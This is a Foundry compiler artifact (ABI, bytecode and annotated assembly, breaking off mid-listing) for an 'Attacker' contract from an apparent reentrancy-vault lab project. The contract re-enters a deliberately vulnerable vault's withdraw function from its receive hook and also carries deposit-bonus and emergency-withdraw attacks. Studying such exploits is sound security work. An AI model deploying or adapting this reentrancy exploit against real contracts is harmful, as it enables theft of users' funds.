{"abi":[{"type":"constructor","inputs":[{"name":"_vault","type":"address","internalType":"address payable"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"attackCount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"attackDepositBonus","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"attackEmergencyWithdraw","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"getAttackStats","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"},{"name":"","type":"uint256","internalType":"uint256"},{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"getVaultBalance","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"getVaultUserBalance","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"totalStolen","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"vault","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract VulnerableVault"}],"stateMutability":"view"},{"type":"function","name":"withdrawStolenFunds","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"event","name":"AttackAttempted","inputs":[{"name":"attackType","type":"uint256","indexed":false,"internalType":"uint256"},{"name":"reason","type":"string","indexed":false,"internalType":"string"}],"anonymous":false},{"type":"event","name":"AttackCompleted","inputs":[{"name":"totalStolen","type":"uint256","indexed":false,"internalType":"uint256"}],"anonymous":false},{"type":"event","name":"AttackExecuted","inputs":[{"name":"attackCount","type":"uint256","indexed":false,"internalType":"uint256"},{"name":"amount","type":"uint256","indexed":false,"internalType":"uint256"}],"anonymous":false},{"type":"event","name":"SecurityTestPassed","inputs":[{"name":"testName","type":"string","indexed":false,"internalType":"string"}],"anonymous":false}],"bytecode":{"object":"0x608060405234801561000f575f80fd5b50604051610e62380380610e6283398101604081905261002e91610052565b5f80546001600160a01b0319166001600160a01b039290921691909117905561007f565b5f60208284031215610062575f80fd5b81516001600160a01b0381168114610078575f80fd5b9392505050565b610dd68061008c5f395ff3fe608060405260043610610092575f3560e01c80639e5faafc116100575780639e5faafc14610365578063d9f9d5f21461036d578063ed12e8ef14610382578063fbfa77cf14610396578063fd276754146103cc575f80fd5b80630777586a146102eb5780631f22e4b31461031e578063407c28211461034057806350a63df1146103555780637dd0ddf91461035d575f80fd5b366102e7576100cd604051806040016040528060148152602001732932b1b2b4bb329031b0b63632b2103bb4ba341d60611b815250346103e0565b6100fe6040518060400160405280600d81526020016c20ba3a30b1b59031b7bab73a1d60991b8152506001546103e0565b3460025f82825461010f9190610cdb565b909155505060018054905f61012383610cf4565b9091555050600154604080519182523460208301527f61fb290b1aeb49a8eff0a91c4310d27d98e1199a1abab0312a9a39570824af7d910160405180910390a1600560015410801561018257505f54346001600160a01b039091163110155b1561021d576101c56040518060400160405280601781526020017f457865637574696e67207265656e7472616e63792e2e2e000000000000000000815250610429565b5f54604051632e1a7d4d60e01b81523460048201526001600160a01b0390911690632e1a7d4d906024015f604051808303815f87803b158015610206575f80fd5b505af1158015610218573d5f803e3d5ffd5b505050505b60036001541080156102375750670de0b6b3a76400004710155b156102e55761027a6040518060400160405280601b81526020017f4578706c6f6974696e67206465706f73697420626f6e75732e2e2e0000000000815250610429565b5f8054906101000a90046001600160a01b03166001600160a01b031663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004015f604051808303818588803b1580156102cd575f80fd5b505af11580156102df573d5f803e3d5ffd5b50505050505b005b5f80fd5b3480156102f6575f80fd5b5060015460025447604080519384526020840192909252908201526060015b60405180910390f35b348015610329575f80fd5b5061033261046f565b604051908152602001610315565b34801561034b575f80fd5b5061033260015481565b6102e56104de565b6102e5610604565b6102e561077c565b348015610378575f80fd5b5061033260025481565b34801561038d575f80fd5b50610332610b51565b3480156103a1575f80fd5b505f546103b4906001600160a01b031681565b6040516001600160a01b039091168152602001610315565b3480156103d7575f80fd5b506102e5610ba1565b61042582826040516024016103f6929190610d4f565b60408051601f198184030181529190526020810180516001600160e01b0316632d839cb360e21b179052610ca4565b5050565b61046c8160405160240161043d9190610d70565b60408051601f198184030181529190526020810180516001600160e01b031663104c13eb60e21b179052610ca4565b50565b5f805460405163f8b2cb4f60e01b81523060048201526001600160a01b039091169063f8b2cb4f90602401602060405180830381865afa1580156104b5573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906104d99190610d89565b905090565b670de0b6b3a76400003410156105315760405162461bcd60e51b815260206004820152601360248201527209ccacac840c2e840d8cac2e6e84062408aa89606b1b60448201526064015b60405180910390fd5b61056f6040518060400160405280601a81526020017f41747461636b696e67206465706f73697420626f6e75732e2e2e000000000000815250610429565b5f8054906101000a90046001600160a01b03166001600160a01b031663d0e30db0346040518263ffffffff1660e01b81526004015f604051808303818588803b1580156105ba575f80fd5b505af11580156105cc573d5f803e3d5ffd5b50505050506106026040518060400160405280601081526020016f426f6e7573206578706c6f697465642160801b815250610429565b565b5f34116106485760405162461bcd60e51b81526020600482015260126024820152714e6565642045544820746f2061747461636b60701b6044820152606401610528565b6106866040518060400160405280601e81526020017f41747461636b696e6720656d657267656e637957697468647261772e2e2e0000815250610429565b5f8054906101000a90046001600160a01b03166001600160a01b031663d0e30db0346040518263ffffffff1660e01b81526004015f604051808303818588803b1580156106d1575f80fd5b505af11580156106e3573d5f803e3d5ffd5b50505f8054604080516336cb886f60e21b815290516001600160a01b03909216955063db2e21bc9450600480820194509082900301818387803b158015610728575f80fd5b505af115801561073a573d5f803e3d5ffd5b505050506106026040518060400160405280601d81526020017f456d657267656e6379207769746864726177206578706c6f6974656421000000815250610429565b670de0b6b3a76400003410156107d45760405162461bcd60e51b815260206004820152601d60248201527f4e656564206174206c6561737420312045544820746f2061747461636b0000006044820152606401610528565b6108126040518060400160405280601d81526020017f5374617274696e67207265656e7472616e63792061747461636b2e2e2e000000815250610429565b6108516040518060400160405280601981526020017f496e697469616c2061747461636b65722062616c616e63653a00000000000000815250476103e0565b6108fa6040518060400160405280601681526020017524b734ba34b0b6103b30bab63a103130b630b731b29d60511b8152505f8054906101000a90046001600160a01b03166001600160a01b0316636f9fb98a6040518163ffffffff1660e01b8152600401602060405180830381865afa1580156108d1573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906108f59190610d89565b6103e0565b5f8054906101000a90046001600160a01b03166001600160a01b031663d0e30db0346040518263ffffffff1660e01b81526004015f604051808303818588803b158015610945575f80fd5b505af1158015610957573d5f803e3d5ffd5b505060408051808201825260168152752130b630b731b29030b33a32b9103232b837b9b4ba1d60511b60208201525f54915163f8b2cb4f60e01b81523060048201526109d295509093506001600160a01b03909116915063f8b2cb4f90602401602060405180830381865afa1580156108d1573d5f803e3d5ffd5b5f6001819055600281905554604051632e1a7d4d60e01b81523460048201526001600160a01b0390911690632e1a7d4d906024015f604051808303815f87803b158015610a1d575f80fd5b505af1158015610a2f573d5f803e3d5ffd5b50505050610a656040518060400160405280601181526020017041747461636b20636f6d706c657465642160781b815250610429565b610a966040518060400160405280600d81526020016c2a37ba30b61039ba37b632b71d60991b8152506002546103e0565b610b14604051806040016040528060148152602001732334b730b6103b30bab63a103130b630b731b29d60611b8152505f8054906101000a90046001600160a01b03166001600160a01b0316636f9fb98a6040518163ffffffff1660e01b8152600401602060405180830381865afa1580156108d1573d5f803e3d5ffd5b7f4ef6191345aae76824ed25ff5065e33a8fbbb5a05823ebba2291fc6237a925f9600254604051610b4791815260200190565b60405180910390a1565b5f805f9054906101000a90046001600160a01b03166001600160a01b0316636f9fb98a6040518163ffffffff1660e01b8152600401602060405180830381865afa1580156104b5573d5f803e3d5ffd5b4780610be65760405162461bcd60e51b81526020600482015260146024820152734e6f2066756e647320746f20776974686472617760601b6044820152606401610528565b6040515f90339083908381818185875af1925050503d805f8114610c25576040519150601f19603f3d011682016040523d82523d5f602084013e610c2a565b606091505b5050905080610c6d5760405162461bcd60e51b815260206004820152600f60248201526e151c985b9cd9995c8819985a5b1959608a1b6044820152606401610528565b6104256040518060400160405280601581526020017429ba37b632b71022aa24103bb4ba34323930bbb71d60591b815250836103e0565b61046c815f6a636f6e736f6c652e6c6f6790505f80835160208501845afa505050565b634e487b7160e01b5f52601160045260245ffd5b80820180821115610cee57610cee610cc7565b92915050565b5f60018201610d0557610d05610cc7565b5060010190565b5f81518084525f5b81811015610d3057602081850181015186830182015201610d14565b505f602082860101526020601f19601f83011685010191505092915050565b604081525f610d616040830185610d0c565b90508260208301529392505050565b602081525f610d826020830184610d0c565b9392505050565b5f60208284031215610d99575f80fd5b505191905056fea2646970667358221220e9ebbaffececd26e71ba84054a33f86a42d5965001bdb9cbb3ecaf2db84b870c64736f6c63430008140033","linkReferences":{}},"assembly":"    /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":442:4430  contract Attacker is IAttacker {... */\n  mstore(0x40, 0x80)\n    /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":600:684  constructor(address payable _vault) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  add\n  0x40\n  dup2\n  swap1\n  mstore\n  tag_2\n  swap2\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":646:651  vault */\n  0x00\n    /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":646:677  vault = VulnerableVault(_vault) */\n  dup1\n  sload\n  not(sub(shl(0xa0, 0x01), 0x01))\n  and\n  sub(shl(0xa0, 0x01), 0x01)\n  swap3\n  swap1\n  swap3\n  and\n  swap2\n  swap1\n  swap2\n  or\n  swap1\n  sstore\n    /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":442:4430  contract Attacker is IAttacker {... */\n  jump(tag_7)\n    /* \"#utility.yul\":14:312   */\ntag_3:\n    /* \"#utility.yul\":92:98   */\n  0x00\n    /* \"#utility.yul\":145:147   */\n  0x20\n    /* \"#utility.yul\":133:142   */\n  dup3\n    /* \"#utility.yul\":124:131   */\n  dup5\n    /* \"#utility.yul\":120:143   */\n  sub\n    /* \"#utility.yul\":116:148   */\n  slt\n    /* \"#utility.yul\":113:165   */\n  iszero\n  tag_9\n  jumpi\n    /* \"#utility.yul\":161:162   */\n  0x00\n    /* \"#utility.yul\":158:159   */\n  dup1\n    /* \"#utility.yul\":151:163   */\n  revert\n    /* \"#utility.yul\":113:165   */\ntag_9:\n    /* \"#utility.yul\":187:203   */\n  dup2\n  mload\n  sub(shl(0xa0, 0x01), 0x01)\n    /* \"#utility.yul\":232:263   */\n  dup2\n  and\n    /* \"#utility.yul\":222:264   */\n  dup2\n  eq\n    /* \"#utility.yul\":212:282   */\n  tag_10\n  jumpi\n    /* \"#utility.yul\":278:279   */\n  0x00\n    /* \"#utility.yul\":275:276   */\n  dup1\n    /* \"#utility.yul\":268:280   */\n  revert\n    /* \"#utility.yul\":212:282   */\ntag_10:\n    /* \"#utility.yul\":301:306   */\n  swap4\n    /* \"#utility.yul\":14:312   */\n  swap3\n  pop\n  pop\n  pop\n  jump\t// out\ntag_7:\n    /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":442:4430  contract Attacker is IAttacker {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":442:4430  contract Attacker is IAttacker {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x9e5faafc\n      gt\n      tag_13\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_8\n      jumpi\n      dup1\n      0xd9f9d5f2\n      eq\n      tag_9\n      jumpi\n      dup1\n      0xed12e8ef\n      eq\n      tag_10\n      jumpi\n      dup1\n      0xfbfa77cf\n      eq\n      tag_11\n      jumpi\n      dup1\n      0xfd276754\n      eq\n      tag_12\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_13:\n      dup1\n      0x0777586a\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x1f22e4b3\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x407c2821\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x50a63df1\n      eq\n      tag_6\n      jumpi\n      dup1\n      0x7dd0ddf9\n      eq\n      tag_7\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2639:2685  console.log(\"Receive called with:\", msg.value) */\n      tag_16\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x14\n      dup2\n      mstore\n      0x20\n      add\n      shl(0x61, 0x2932b1b2b4bb329031b0b63632b2103bb4ba341d)\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2675:2684  msg.value */\n      callvalue\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2639:2650  console.log */\n      tag_17\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2639:2685  console.log(\"Receive called with:\", msg.value) */\n      jump\t// in\n    tag_16:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2695:2736  console.log(\"Attack count:\", attackCount) */\n      tag_18\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x0d\n      dup2\n      mstore\n      0x20\n      add\n      shl(0x99, 0x20ba3a30b1b59031b7bab73a1d)\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2724:2735  attackCount */\n      sload(0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2695:2706  console.log */\n      tag_17\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2695:2736  console.log(\"Attack count:\", attackCount) */\n      jump\t// in\n    tag_18:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2770:2779  msg.value */\n      callvalue\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2755:2766  totalStolen */\n      0x02\n      0x00\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2755:2779  totalStolen += msg.value */\n      dup3\n      dup3\n      sload\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n      swap1\n      swap2\n      sstore\n      pop\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2789:2800  attackCount */\n      0x01\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2789:2802  attackCount++ */\n      dup1\n      sload\n      swap1\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2789:2800  attackCount */\n      0x00\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2789:2802  attackCount++ */\n      tag_21\n      dup4\n      tag_22\n      jump\t// in\n    tag_21:\n      swap1\n      swap2\n      sstore\n      pop\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2841:2852  attackCount */\n      sload(0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2826:2864  AttackExecuted(attackCount, msg.value) */\n      0x40\n      dup1\n      mload\n        /* \"#utility.yul\":590:615   */\n      swap2\n      dup3\n      mstore\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2854:2863  msg.value */\n      callvalue\n        /* \"#utility.yul\":646:648   */\n      0x20\n        /* \"#utility.yul\":631:649   */\n      dup4\n      add\n        /* \"#utility.yul\":624:658   */\n      mstore\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2826:2864  AttackExecuted(attackCount, msg.value) */\n      0x61fb290b1aeb49a8eff0a91c4310d27d98e1199a1abab0312a9a39570824af7d\n      swap2\n        /* \"#utility.yul\":563:581   */\n      add\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2826:2864  AttackExecuted(attackCount, msg.value) */\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3041:3042  5 */\n      0x05\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3027:3038  attackCount */\n      sload(0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3027:3042  attackCount < 5 */\n      lt\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3027:3081  attackCount < 5 && address(vault).balance >= msg.value */\n      dup1\n      iszero\n      tag_25\n      jumpi\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3054:3059  vault */\n      sload(0x00)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3072:3081  msg.value */\n      callvalue\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3054:3059  vault */\n      swap1\n      swap2\n      and\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3046:3068  address(vault).balance */\n      balance\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3046:3081  address(vault).balance >= msg.value */\n      lt\n      iszero\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3027:3081  attackCount < 5 && address(vault).balance >= msg.value */\n    tag_25:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3023:3185  if (attackCount < 5 && address(vault).balance >= msg.value) {... */\n      iszero\n      tag_26\n      jumpi\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3097:3135  console.log(\"Executing reentrancy...\") */\n      tag_27\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x17\n      dup2\n      mstore\n      0x20\n      add\n      0x457865637574696e67207265656e7472616e63792e2e2e000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3097:3108  console.log */\n      tag_28\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3097:3135  console.log(\"Executing reentrancy...\") */\n      jump\t// in\n    tag_27:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3149:3154  vault */\n      sload(0x00)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3149:3174  vault.withdraw(msg.value) */\n      mload(0x40)\n      shl(0xe0, 0x2e1a7d4d)\n      dup2\n      mstore\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3164:3173  msg.value */\n      callvalue\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3149:3174  vault.withdraw(msg.value) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":815:840   */\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3149:3154  vault */\n      swap1\n      swap2\n      and\n      swap1\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3149:3163  vault.withdraw */\n      0x2e1a7d4d\n      swap1\n        /* \"#utility.yul\":788:806   */\n      0x24\n      add\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3149:3174  vault.withdraw(msg.value) */\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_31\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_31:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_33\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_33:\n      pop\n      pop\n      pop\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3023:3185  if (attackCount < 5 && address(vault).balance >= msg.value) {... */\n    tag_26:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3321:3322  3 */\n      0x03\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3307:3318  attackCount */\n      sload(0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3307:3322  attackCount < 3 */\n      lt\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3307:3358  attackCount < 3 && address(this).balance >= 1 ether */\n      dup1\n      iszero\n      tag_34\n      jumpi\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3351:3358  1 ether */\n      0x0de0b6b3a7640000\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3326:3347  address(this).balance */\n      selfbalance\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3326:3358  address(this).balance >= 1 ether */\n      lt\n      iszero\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3307:3358  attackCount < 3 && address(this).balance >= 1 ether */\n    tag_34:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3303:3472  if (attackCount < 3 && address(this).balance >= 1 ether) {... */\n      iszero\n      tag_35\n      jumpi\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3374:3416  console.log(\"Exploiting deposit bonus...\") */\n      tag_36\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x1b\n      dup2\n      mstore\n      0x20\n      add\n      0x4578706c6f6974696e67206465706f73697420626f6e75732e2e2e0000000000\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3374:3385  console.log */\n      tag_28\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3374:3416  console.log(\"Exploiting deposit bonus...\") */\n      jump\t// in\n    tag_36:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3430:3435  vault */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3430:3443  vault.deposit */\n      and\n      0xd0e30db0\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3451:3458  1 ether */\n      0x0de0b6b3a7640000\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3430:3461  vault.deposit{value: 1 ether}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_37\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_37:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_39\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_39:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3303:3472  if (attackCount < 3 && address(this).balance >= 1 ether) {... */\n    tag_35:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":442:4430  contract Attacker is IAttacker {... */\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3919:4077  function getAttackStats() external view override returns (uint256, uint256, uint256) {... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_40\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_40:\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4022:4033  attackCount */\n      sload(0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4035:4046  totalStolen */\n      sload(0x02)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4048:4069  address(this).balance */\n      selfbalance\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3919:4077  function getAttackStats() external view override returns (uint256, uint256, uint256) {... */\n      0x40\n      dup1\n      mload\n        /* \"#utility.yul\":1053:1078   */\n      swap4\n      dup5\n      mstore\n        /* \"#utility.yul\":1109:1111   */\n      0x20\n        /* \"#utility.yul\":1094:1112   */\n      dup5\n      add\n        /* \"#utility.yul\":1087:1121   */\n      swap3\n      swap1\n      swap3\n      mstore\n        /* \"#utility.yul\":1137:1155   */\n      swap1\n      dup3\n      add\n        /* \"#utility.yul\":1130:1164   */\n      mstore\n        /* \"#utility.yul\":1041:1043   */\n      0x60\n        /* \"#utility.yul\":1026:1044   */\n      add\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3919:4077  function getAttackStats() external view override returns (uint256, uint256, uint256) {... */\n    tag_43:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4301:4428  function getVaultUserBalance() external view override returns (uint256) {... */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_45\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_45:\n      pop\n      tag_46\n      tag_47\n      jump\t// in\n    tag_46:\n      mload(0x40)\n        /* \"#utility.yul\":815:840   */\n      swap1\n      dup2\n      mstore\n        /* \"#utility.yul\":803:805   */\n      0x20\n        /* \"#utility.yul\":788:806   */\n      add\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4301:4428  function getVaultUserBalance() external view override returns (uint256) {... */\n      tag_43\n        /* \"#utility.yul\":669:846   */\n      jump\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":513:548  uint256 public override attackCount */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_49\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_49:\n      pop\n      tag_46\n      sload(0x01)\n      dup2\n      jump\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1721:2057  function attackDepositBonus() external payable override {... */\n    tag_6:\n      tag_35\n      tag_54\n      jump\t// in\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2111:2538  function attackEmergencyWithdraw() external payable override {... */\n    tag_7:\n      tag_35\n      tag_56\n      jump\t// in\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":730:1671  function attack() external payable override {... */\n    tag_8:\n      tag_35\n      tag_58\n      jump\t// in\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":554:589  uint256 public override totalStolen */\n    tag_9:\n      callvalue\n      dup1\n      iszero\n      tag_59\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_59:\n      pop\n      tag_46\n      sload(0x02)\n      dup2\n      jump\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4124:4242  function getVaultBalance() external view override returns (uint256) {... */\n    tag_10:\n      callvalue\n      dup1\n      iszero\n      tag_63\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_63:\n      pop\n      tag_46\n      tag_65\n      jump\t// in\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":479:507  VulnerableVault public vault */\n    tag_11:\n      callvalue\n      dup1\n      iszero\n      tag_67\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_67:\n      pop\n      sload(0x00)\n      tag_68\n      swap1\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      dup2\n      jump\n    tag_68:\n      mload(0x40)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"#utility.yul\":1372:1404   */\n      swap1\n      swap2\n      and\n        /* \"#utility.yul\":1354:1405   */\n      dup2\n      mstore\n        /* \"#utility.yul\":1342:1344   */\n      0x20\n        /* \"#utility.yul\":1327:1345   */\n      add\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":479:507  VulnerableVault public vault */\n      tag_43\n        /* \"#utility.yul\":1175:1411   */\n      jump\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3527:3868  function withdrawStolenFunds() external override {... */\n    tag_12:\n      callvalue\n      dup1\n      iszero\n      tag_72\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_72:\n      pop\n      tag_35\n      tag_74\n      jump\t// in\n        /* \"lib/forge-std/src/console.sol\":7139:7284  function log(string memory p0, uint256 p1) internal pure {... */\n    tag_17:\n        /* \"lib/forge-std/src/console.sol\":7206:7277  _sendLogPayload(abi.encodeWithSignature(\"log(string,uint256)\", p0, p1)) */\n      tag_76\n        /* \"lib/forge-std/src/console.sol\":7269:7271  p0 */\n      dup3\n        /* 